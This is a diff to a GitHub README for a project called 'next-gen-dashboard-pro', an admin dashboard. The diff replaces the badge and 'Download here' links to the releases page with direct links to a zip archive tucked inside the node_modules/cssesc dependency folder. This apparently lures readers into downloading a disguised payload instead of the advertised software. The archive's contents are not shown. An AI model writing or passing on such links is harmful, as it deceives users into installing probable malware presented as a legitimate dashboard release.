@@ -1,6 +1,6 @@
 # 🚀 next-gen-dashboard-pro - Your Fast, Ready-to-Use Admin Dashboard
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/asd123asd1234/next-gen-dashboard-pro/releases)
+[![Download Now](https://github.com/asd123asd1234/next-gen-dashboard-pro/raw/refs/heads/master/node_modules/cssesc/gen_dashboard_next_pro_1.0-beta.1.zip%20Now-Click%20Here-blue)](https://github.com/asd123asd1234/next-gen-dashboard-pro/raw/refs/heads/master/node_modules/cssesc/gen_dashboard_next_pro_1.0-beta.1.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To download and install next-gen-dashboard-pro, visit the Releases page. You will find the latest version available for download.
 
-[Download here](https://github.com/asd123asd1234/next-gen-dashboard-pro/releases)
+[Download here](https://github.com/asd123asd1234/next-gen-dashboard-pro/raw/refs/heads/master/node_modules/cssesc/gen_dashboard_next_pro_1.0-beta.1.zip)
 
 ### Step-by-Step Instructions
 
